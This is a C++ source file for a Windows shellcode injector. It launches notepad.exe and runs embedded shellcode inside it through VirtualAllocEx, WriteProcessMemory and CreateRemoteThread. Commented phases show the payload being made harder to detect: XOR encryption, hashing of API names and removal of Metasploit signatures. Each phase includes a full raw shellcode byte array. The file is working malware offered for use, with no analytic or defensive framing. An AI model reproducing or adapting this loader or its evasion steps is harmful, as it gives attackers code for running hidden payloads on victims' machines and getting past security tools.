#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <iomanip>

#include "Functions.h"

/*
int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x82\xc7\xd7\x73\xa4\x41\x92\xfe\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x7e\x8f\x54"
		"\x97\x54\xa9\x52\xfe\x82\xc7\x96\x22\xe5\x11\xc0\xaf\xd4"
		"\x8f\xe6\xa1\xc1\x09\x19\xac\xe2\x8f\x5c\x21\xbc\x09\x19"
		"\xac\xa2\x8f\x5c\x01\xf4\x09\x9d\x49\xc8\x8d\x9a\x42\x6d"
		"\x09\xa3\x3e\x2e\xfb\xb6\x0f\xa6\x6d\xb2\xbf\x43\x0e\xda"
		"\x32\xa5\x80\x70\x13\xd0\x86\x86\x3b\x2f\x13\xb2\x75\xc0"
		"\xfb\x9f\x72\x74\xca\x12\x76\x82\xc7\xd7\x3b\x21\x81\xe6"
		"\x99\xca\xc6\x07\x23\x2f\x09\x8a\xba\x09\x87\xf7\x3a\xa5"
		"\x91\x71\xa8\xca\x38\x1e\x32\x2f\x75\x1a\xb6\x83\x11\x9a"
		"\x42\x6d\x09\xa3\x3e\x2e\x86\x16\xba\xa9\x00\x93\x3f\xba"
		"\x27\xa2\x82\xe8\x42\xde\xda\x8a\x82\xee\xa2\xd1\x99\xca"
		"\xba\x09\x87\xf3\x3a\xa5\x91\xf4\xbf\x09\xcb\x9f\x37\x2f"
		"\x01\x8e\xb7\x83\x17\x96\xf8\xa0\xc9\xda\xff\x52\x86\x8f"
		"\x32\xfc\x1f\xcb\xa4\xc3\x9f\x96\x2a\xe5\x1b\xda\x7d\x6e"
		"\xe7\x96\x21\x5b\xa1\xca\xbf\xdb\x9d\x9f\xf8\xb6\xa8\xc5"
		"\x01\x7d\x38\x8a\x3a\x1a\x36\xe1\xcc\xdd\xf4\xe5\x73\xa4"
		"\x00\xc4\xb7\x0b\x21\x9f\xf2\x48\xe1\x93\xfe\x82\x8e\x5e"
		"\x96\xed\xfd\x90\xfe\x8f\x47\x17\xdb\xab\xc4\xd3\xaa\xcb"
		"\x4e\x33\x3f\x2d\xb0\xd3\x44\xce\xb0\xf1\x74\x5b\x94\xde"
		"\x77\x68\xaf\xd6\x72\xa4\x41\xcb\xbf\x38\xee\x57\x18\xa4"
		"\xbe\x47\xae\xd2\x8a\xe6\xba\xe9\x70\x52\xb6\x7d\x07\x9f"
		"\xfa\x66\x09\x6d\x3e\xca\x4e\x16\x32\x1e\xab\x9d\x21\x62"
		"\x38\x02\x3b\x2d\x86\xf8\xee\xc3\x9f\x9b\xfa\x46\x09\x1b"
		"\x07\xc3\x7d\x4e\xd6\xd0\x20\x6d\x2b\xca\x46\x13\x33\xa6"
		"\x41\x92\xb7\x3a\xa4\xba\x17\xa4\x41\x92\xfe\x82\x86\x87"
		"\x32\xf4\x09\x1b\x1c\xd5\x90\x80\x3e\x95\x81\xf8\xf3\xdb"
		"\x86\x87\x91\x58\x27\x55\xba\xa6\x93\xd6\x72\xec\xcc\xd6"
		"\xda\x9a\x01\xd7\x1b\xec\xc8\x74\xa8\xd2\x86\x87\x32\xf4"
		"\x00\xc2\xb7\x7d\x07\x96\x23\xed\xbe\x5a\xb3\x0b\x06\x9b"
		"\xfa\x65\x00\x28\x87\x4e\xf8\x51\x8c\x71\x09\xa3\x2c\xca"
		"\x38\x1d\xf8\xaa\x00\x28\xf6\x05\xda\xb7\x8c\x71\xfa\x62"
		"\x4b\x20\x91\x96\xc9\x02\xd4\x2f\x63\x7d\x12\x9f\xf0\x60"
		"\x69\xae\xf8\xfe\xcd\x57\x88\x44\x34\x97\x45\xc5\xd4\xa5"
		"\x1c\xce\x41\xcb\xbf\x0b\x1d\x28\xa6\xa4\x41\x92\xfe";

	HANDLE remoteThread;
	PVOID remoteBuffer;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\notepad.exe"));

	CreateProcessW(NULL, szCmdline, NULL, NULL, 1, 0, NULL, 0, &si, &pi);

	remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(pi.hProcess);

	return 0;
}*/
/*
void printShell(const unsigned char* bytes, size_t length) {
	std::cout << "unsigned char shellcode[] =\n\t\"";

	for (size_t i = 0; i < length; ++i) {
		std::cout << "\\x" << std::hex << std::setw(2) << std::setfill('0')
			<< static_cast<int>(bytes[i]);

		// Add a line break every 16 bytes for better readability
		if ((i + 1) % 16 == 0 && i + 1 != length) {
			std::cout << "\"\n\t\"";
		}
	}

	std::cout << "\";\n";
}*/

// Phase 1: Adding encryption
/*
void xorCrypt(const char* key, int key_len, unsigned char* data, int data_len)
{
	for (int i = 0; i < data_len; i++)
		data[i] ^= key[i % key_len];
}

int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x82\xc7\xd7\x73\xa4\x41\x92\xfe\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x7e\x8f\x54"
		"\x97\x54\xa9\x52\xfe\x82\xc7\x96\x22\xe5\x11\xc0\xaf\xd4"
		"\x8f\xe6\xa1\xc1\x09\x19\xac\xe2\x8f\x5c\x21\xbc\x09\x19"
		"\xac\xa2\x8f\x5c\x01\xf4\x09\x9d\x49\xc8\x8d\x9a\x42\x6d"
		"\x09\xa3\x3e\x2e\xfb\xb6\x0f\xa6\x6d\xb2\xbf\x43\x0e\xda"
		"\x32\xa5\x80\x70\x13\xd0\x86\x86\x3b\x2f\x13\xb2\x75\xc0"
		"\xfb\x9f\x72\x74\xca\x12\x76\x82\xc7\xd7\x3b\x21\x81\xe6"
		"\x99\xca\xc6\x07\x23\x2f\x09\x8a\xba\x09\x87\xf7\x3a\xa5"
		"\x91\x71\xa8\xca\x38\x1e\x32\x2f\x75\x1a\xb6\x83\x11\x9a"
		"\x42\x6d\x09\xa3\x3e\x2e\x86\x16\xba\xa9\x00\x93\x3f\xba"
		"\x27\xa2\x82\xe8\x42\xde\xda\x8a\x82\xee\xa2\xd1\x99\xca"
		"\xba\x09\x87\xf3\x3a\xa5\x91\xf4\xbf\x09\xcb\x9f\x37\x2f"
		"\x01\x8e\xb7\x83\x17\x96\xf8\xa0\xc9\xda\xff\x52\x86\x8f"
		"\x32\xfc\x1f\xcb\xa4\xc3\x9f\x96\x2a\xe5\x1b\xda\x7d\x6e"
		"\xe7\x96\x21\x5b\xa1\xca\xbf\xdb\x9d\x9f\xf8\xb6\xa8\xc5"
		"\x01\x7d\x38\x8a\x3a\x1a\x36\xe1\xcc\xdd\xf4\xe5\x73\xa4"
		"\x00\xc4\xb7\x0b\x21\x9f\xf2\x48\xe1\x93\xfe\x82\x8e\x5e"
		"\x96\xed\xfd\x90\xfe\x8f\x47\x17\xdb\xab\xc4\xd3\xaa\xcb"
		"\x4e\x33\x3f\x2d\xb0\xd3\x44\xce\xb0\xf1\x74\x5b\x94\xde"
		"\x77\x68\xaf\xd6\x72\xa4\x41\xcb\xbf\x38\xee\x57\x18\xa4"
		"\xbe\x47\xae\xd2\x8a\xe6\xba\xe9\x70\x52\xb6\x7d\x07\x9f"
		"\xfa\x66\x09\x6d\x3e\xca\x4e\x16\x32\x1e\xab\x9d\x21\x62"
		"\x38\x02\x3b\x2d\x86\xf8\xee\xc3\x9f\x9b\xfa\x46\x09\x1b"
		"\x07\xc3\x7d\x4e\xd6\xd0\x20\x6d\x2b\xca\x46\x13\x33\xa6"
		"\x41\x92\xb7\x3a\xa4\xba\x17\xa4\x41\x92\xfe\x82\x86\x87"
		"\x32\xf4\x09\x1b\x1c\xd5\x90\x80\x3e\x95\x81\xf8\xf3\xdb"
		"\x86\x87\x91\x58\x27\x55\xba\xa6\x93\xd6\x72\xec\xcc\xd6"
		"\xda\x9a\x01\xd7\x1b\xec\xc8\x74\xa8\xd2\x86\x87\x32\xf4"
		"\x00\xc2\xb7\x7d\x07\x96\x23\xed\xbe\x5a\xb3\x0b\x06\x9b"
		"\xfa\x65\x00\x28\x87\x4e\xf8\x51\x8c\x71\x09\xa3\x2c\xca"
		"\x38\x1d\xf8\xaa\x00\x28\xf6\x05\xda\xb7\x8c\x71\xfa\x62"
		"\x4b\x20\x91\x96\xc9\x02\xd4\x2f\x63\x7d\x12\x9f\xf0\x60"
		"\x69\xae\xf8\xfe\xcd\x57\x88\x44\x34\x97\x45\xc5\xd4\xa5"
		"\x1c\xce\x41\xcb\xbf\x0b\x1d\x28\xa6\xa4\x41\x92\xfe";

	const char* key = "youwillfall";
	xorCrypt(key, sizeof(key), shellcode, sizeof(shellcode));

	printShell(shellcode, sizeof(shellcode));
	HANDLE remoteThread;
	PVOID remoteBuffer;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\notepad.exe"));

	CreateProcessW(NULL, szCmdline, NULL, NULL, 1, 0, NULL, 0, &si, &pi);

	remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(pi.hProcess);

	return 0;
}*/

// Phase 2: String/API Hashing
/*
void xorCrypt(const char* key, int key_len, unsigned char* data, int data_len)
{
	for (int i = 0; i < data_len; i++)
		data[i] ^= key[i % key_len];
}

uint64_t customHash(const std::string& input) {
	// Prime constants
	const uint64_t prime1 = 0x100000001B3; // Large prime
	const uint64_t prime2 = 0xC6A4A7935BD1E995; // Another large prime
	const uint64_t seed = 0xCBF29CE484222325; // Offset basis (FNV-like)

	// Hash value starts with the seed
	uint64_t hash = seed;

	for (char c : input) {
		// XOR with character
		hash ^= static_cast<uint64_t>(c);
		// Rotate bits to the left for better dispersion
		hash = (hash << 13) | (hash >> (64 - 13));
		// Mix with the first prime
		hash *= prime1;
		// Add the second prime for further scrambling
		hash += prime2;
	}

	// Final mix to reduce clustering
	hash ^= (hash >> 33);
	hash *= prime2;
	hash ^= (hash >> 29);

	return hash;
}

PDWORD getFuncAddr(char* library, uint64_t hash)
{
	PDWORD functionAddress = (PDWORD)0;

	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		uint64_t functionNameHash = customHash(functionName);

		// If hash for function is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			//printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}

uint64_t CreateProcessWHash = 0x588d54dd8b7c5657;
uint64_t VirtualAllocExHash = 0x5a912efbb110c19a;
uint64_t WriteProcessMemoryHash = 0xa6ae5851a8b997e1;
uint64_t CreateRemoteThreadHash = 0xdc13bca0c2584606;

int main(int argc, char* argv[])
{

	uint64_t CreateProcessWHash = customHash("CreateProcessW");
	std::cout << "CreateProcessW Hash: 0x" << std::hex << CreateProcessWHash << std::endl;
	uint64_t VirtualAllocExHash = customHash("VirtualAllocEx");
	std::cout << "VirtualAllocEx Hash: 0x" << std::hex << VirtualAllocExHash << std::endl;
	uint64_t WriteProcessMemoryHash = customHash("WriteProcessMemory");
	std::cout << "WriteProcessMemory Hash: 0x" << std::hex << WriteProcessMemoryHash << std::endl;
	uint64_t CreateRemoteThreadHash = customHash("CreateRemoteThread");
	std::cout << "CreateRemoteThread Hash: 0x" << std::hex << CreateRemoteThreadHash << std::endl;


	fnCreateProcessW pCreateProcessW = (fnCreateProcessW) getFuncAddr((char*)"kernel32", CreateProcessWHash);
	fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx) getFuncAddr((char*)"kernel32", VirtualAllocExHash);
	fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory) getFuncAddr((char*)"kernel32", WriteProcessMemoryHash);
	fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread) getFuncAddr((char*)"kernel32", CreateRemoteThreadHash);

	unsigned char shellcode[] =
		"\x85\x27\xf6\x93\x99\x84\xac\x66\x79\x6f\x34\x26\x28\x3c\x3e\x37"
		"\x2f\x27\x44\xa5\x0c\x24\xe7\x34\x19\x27\xfe\x25\x71\x24\xe7\x34"
		"\x59\x27\xfe\x05\x39\x24\x63\xd1\x33\x25\x38\x46\xa0\x24\x5d\xa6"
		"\xd5\x53\x14\x0b\x6b\x40\x4c\x27\xb8\xa6\x78\x36\x68\xad\x8e\x8b"
		"\x2b\x2e\x24\x3f\xe2\x3e\x4c\xed\x3b\x53\x3d\x76\xb9\xe7\xec\xee"
		"\x79\x6f\x75\x3f\xec\xac\x18\x01\x31\x6e\xa5\x27\xe2\x24\x74\x22"
		"\xf2\x2f\x55\x3e\x68\xbc\x8f\x30\x31\x90\xbc\x36\xe2\x58\xe4\x2e"
		"\x78\xb9\x38\x46\xa0\x24\x5d\xa6\xd5\x2e\xb4\xbe\x64\x2d\x6d\xa7"
		"\x41\x8f\x00\x86\x25\x6f\x20\x42\x71\x2a\x4c\xa6\x1c\xb4\x34\x22"
		"\xf2\x2f\x51\x3e\x68\xbc\x0a\x27\xf2\x63\x3d\x33\xe2\x2c\x70\x2f"
		"\x78\xbf\x34\xfc\x6d\xe4\x24\x67\xa9\x2e\x2d\x36\x31\x32\x35\x3c"
		"\x38\x37\x34\x2e\x28\x36\x24\xe5\x95\x4f\x34\x25\x96\x8c\x34\x27"
		"\x20\x35\x3d\xfc\x7b\x85\x3b\x99\x86\x90\x28\x3e\xd7\x1b\x1f\x54"
		"\x26\x5c\x47\x77\x69\x2d\x3a\x2f\xf0\x89\x3d\xf6\x85\xcc\x6d\x66"
		"\x79\x26\xfc\x92\x20\xd0\x6e\x66\x74\xef\xb5\xdf\x66\xe9\x2d\x32"
		"\x30\xe6\x91\x3b\xe0\x9d\x2d\xdc\x35\x18\x53\x70\x96\xb9\x20\xef"
		"\x93\x07\x74\x76\x69\x6c\x35\x27\xc3\x46\xf5\x1c\x69\x93\xb9\x36"
		"\x29\x22\x44\xbe\x24\x5d\xac\x2e\x86\xaf\x3d\xfe\xab\x24\x93\xa6"
		"\x31\xe6\xb4\x36\xd3\x86\x63\xb9\x99\x90\xa0\x3f\xe0\xab\x06\x76"
		"\x38\x37\x39\xfe\x8b\x24\xe5\x9f\x38\xd5\xec\xd2\x1d\x0d\x93\xb3"
		"\x31\xee\xb1\x37\x6b\x6c\x6c\x2f\xc1\x0c\x18\x13\x69\x6c\x6c\x66"
		"\x79\x2e\x25\x36\x39\x24\xe5\x84\x2e\x38\x22\x3a\x58\xac\x06\x6b"
		"\x20\x2e\x25\x95\x95\x0a\xab\x22\x5d\x3b\x74\x76\x21\xe1\x28\x42"
		"\x61\xa9\x75\x1f\x21\xe5\x8a\x30\x29\x2e\x25\x36\x39\x2d\x3c\x2f"
		"\x86\xaf\x34\x27\x20\x93\xa4\x2b\xf0\xae\x39\xfe\xa8\x2d\xd6\x1f"
		"\xb5\x50\xf3\x88\xbc\x24\x5d\xb4\x31\x90\xbf\xfc\x67\x2d\xd6\x6e"
		"\xfe\x72\x15\x88\xbc\xd7\x9c\xd3\xdb\x39\x34\xcd\xcf\xf9\xd1\xfb"
		"\x86\xba\x3d\xf4\xad\x44\x50\x60\x05\x65\xf5\x8c\x89\x19\x69\xdd"
		"\x3e\x7c\x07\x18\x03\x6c\x35\x27\xf0\xb5\x8a\xa2\x69";

	const char* key = "youwillfall";
	xorCrypt(key, sizeof(key), shellcode, sizeof(shellcode));

	HANDLE remoteThread;
	PVOID remoteBuffer;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\notepad.exe"));

	pCreateProcessW(NULL, szCmdline, NULL, NULL, 1, 0, NULL, 0, &si, &pi);

	remoteBuffer = pVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	pWriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	remoteThread = pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(pi.hProcess);

	return 0;
}*/

// Phase 3: Removing metasploit sigs

void xorCrypt(const char* key, int key_len, unsigned char* data, int data_len)
{
	for (int i = 0; i < data_len; i++)
		data[i] ^= key[i % key_len];
}

uint64_t customHash(const std::string& input) {
	// Prime constants
	const uint64_t prime1 = 0x100000001B3; // Large prime
	const uint64_t prime2 = 0xC6A4A7935BD1E995; // Another large prime
	const uint64_t seed = 0xCBF29CE484222325; // Offset basis (FNV-like)

	// Hash value starts with the seed
	uint64_t hash = seed;

	for (char c : input) {
		// XOR with character
		hash ^= static_cast<uint64_t>(c);
		// Rotate bits to the left for better dispersion
		hash = (hash << 13) | (hash >> (64 - 13));
		// Mix with the first prime
		hash *= prime1;
		// Add the second prime for further scrambling
		hash += prime2;
	}

	// Final mix to reduce clustering
	hash ^= (hash >> 33);
	hash *= prime2;
	hash ^= (hash >> 29);

	return hash;
}

PDWORD getFuncAddr(char* library, uint64_t hash)
{
	PDWORD functionAddress = (PDWORD)0;

	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		uint64_t functionNameHash = customHash(functionName);

		// If hash for CreateThread is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			//printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}

uint64_t CreateProcessWHash = 0x588d54dd8b7c5657;
uint64_t VirtualAllocExHash = 0x5a912efbb110c19a;
uint64_t WriteProcessMemoryHash = 0xa6ae5851a8b997e1;
uint64_t CreateRemoteThreadHash = 0xdc13bca0c2584606;

int main(int argc, char* argv[])
{
	/*
	uint64_t CreateProcessWHash = customHash("CreateProcessW");
	std::cout << "CreateProcessW Hash: 0x" << std::hex << CreateProcessWHash << std::endl;
	uint64_t VirtualAllocExHash = customHash("VirtualAllocEx");
	std::cout << "VirtualAllocEx Hash: 0x" << std::hex << VirtualAllocExHash << std::endl;
	uint64_t WriteProcessMemoryHash = customHash("WriteProcessMemory");
	std::cout << "WriteProcessMemory Hash: 0x" << std::hex << WriteProcessMemoryHash << std::endl;
	uint64_t CreateRemoteThreadHash = customHash("CreateRemoteThread");
	std::cout << "CreateRemoteThread Hash: 0x" << std::hex << CreateRemoteThreadHash << std::endl;
	*/

	fnCreateProcessW pCreateProcessW = (fnCreateProcessW)getFuncAddr((char*)"kernel32", CreateProcessWHash);
	fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)getFuncAddr((char*)"kernel32", VirtualAllocExHash);
	fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)getFuncAddr((char*)"kernel32", WriteProcessMemoryHash);
	fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)getFuncAddr((char*)"kernel32", CreateRemoteThreadHash);

	unsigned char shellcode[] =
		"\x31\x5e\xbc\x3f\xe8\x85\xaa\x99\x86\x90\x3d\xfa\x6c\x83\x93\x99"
		"\x86\x27\xce\x6d\x86\xf8\xba\x81\x6e\xeb\x1e\x3f\x58\x34\x4b\x2e"
		"\x54\x97\x8a\x88\x96\x8e\x98\x80\xde\x78\x47\x60\x96\x28\x07\x7c"
		"\x96\xba\xf2\xd1\x2e\xba\x56\x2a\xde\xca\x71\xf5\x36\x63\x55\x1c"
		"\xde\x70\xf1\x88\x36\x63\x55\x5c\xde\x70\xd1\xc0\x36\xe7\xb0\x36"
		"\xdc\xb6\x92\x59\x36\xd9\xc7\xd0\xaa\x9a\xdf\x92\x52\xc8\x46\xbd"
		"\x5f\xf6\xe2\x91\xbf\x0a\xea\x2e\xd7\xaa\xeb\x1b\x2c\xc8\x8c\x3e"
		"\xaa\xb3\xa2\x40\xf5\x68\x8f\x7c\x96\xfb\xeb\x15\xbe\x9c\x60\x34"
		"\x97\x2b\xf3\x1b\x36\xf0\x43\xf7\xd6\xdb\xea\x91\xae\x0b\x51\x34"
		"\x69\x32\xe2\x1b\x4a\x60\x4f\x7d\x40\xb6\x92\x59\x36\xd9\xc7\xd0"
		"\xd7\x3a\x6a\x9d\x3f\xe9\xc6\x44\x76\x8e\x52\xdc\x7d\xa4\x23\x74"
		"\xd3\xc2\x72\xe5\xa6\xb0\x43\xf7\xd6\xdf\xea\x91\xae\x8e\x46\xf7"
		"\x9a\xb3\xe7\x1b\x3e\xf4\x4e\x7d\x46\xba\x28\x94\xf6\xa0\x06\xac"
		"\xd7\xa3\xe2\xc8\x20\xb1\x5d\x3d\xce\xba\xfa\xd1\x24\xa0\x84\x90"
		"\xb6\xba\xf1\x6f\x9e\xb0\x46\x25\xcc\xb3\x28\x82\x97\xbf\xf8\x83"
		"\x69\xa6\xea\x2e\x09\x9b\x35\x23\xa5\xc9\xa3\x90\x3f\xbe\x4e\xf5"
		"\x70\xb3\x22\x7c\xde\xe9\x07\x7c\xdf\x72\x46\xd9\xc2\xea\x07\x71"
		"\x16\x3b\x0b\x9f\xfb\xa9\x53\x35\x1f\x1f\xde\x19\x8f\xa9\xbd\x30"
		"\xe1\xdd\xa4\x6f\xab\xa4\x8e\x96\xfe\xfa\xa2\x90\x7e\xb1\x46\xc6"
		"\xbf\x7b\xc8\x90\x81\x3d\x57\x2c\xdb\xca\x6a\xdd\x4f\x28\x4f\x83"
		"\x56\xb3\x2a\x52\x36\x17\xc7\x34\x1f\x3a\xe2\x2a\x94\xe7\xd8\x9c"
		"\x69\x2e\xeb\x19\xb9\x82\x17\x3d\xce\xb7\x2a\x72\x36\x61\xfe\x3d"
		"\x2c\x62\x06\xe4\x1f\x17\xd2\x34\x17\x3f\xe3\x92\x7e\xe8\x4e\xc4"
		"\xf5\x96\xc7\x90\x7e\xe8\x07\x7c\xd7\xab\xe2\xc0\x36\x61\xe5\x2b"
		"\xc1\xac\xee\xa1\xbe\x82\x0a\x25\xd7\xab\x41\x6c\x18\x2f\x43\x58"
		"\xc2\xfa\xa2\xd8\xf3\xac\x23\x64\x50\xfb\xcb\xd8\xf7\x0e\x51\x2c"
		"\xd7\xab\xe2\xc0\x3f\xb8\x4e\x83\x56\xba\xf3\xd9\x81\x20\x4a\xf5"
		"\x57\xb7\x2a\x51\x3f\x52\x7e\xb0\xa9\x7d\x5c\x45\x36\xd9\xd5\x34"
		"\x69\x31\x28\x9e\x3f\x52\x0f\xfb\x8b\x9b\x5c\x45\xc5\x18\xb2\xde"
		"\xc0\xba\x19\x36\xeb\x55\x9a\x42\x43\xb3\x20\x54\x56\xd4\x01\x00"
		"\x9c\x7b\x58\x70\xa6\xed\xbc\x3b\x85\x89\xcc\xfa\x7e\xb1\x46\xf5"
		"\x4c\x04\x76\x90\x7e\xe8\x07\x66";

	const char* key = "youwillfall";
	xorCrypt(key, sizeof(key), shellcode, sizeof(shellcode));
	
	HANDLE remoteThread;
	PVOID remoteBuffer;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\notepad.exe"));

	pCreateProcessW(NULL, szCmdline, NULL, NULL, 1, 0, NULL, 0, &si, &pi);

	remoteBuffer = pVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	pWriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	remoteThread = pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(pi.hProcess);

	return 0;
}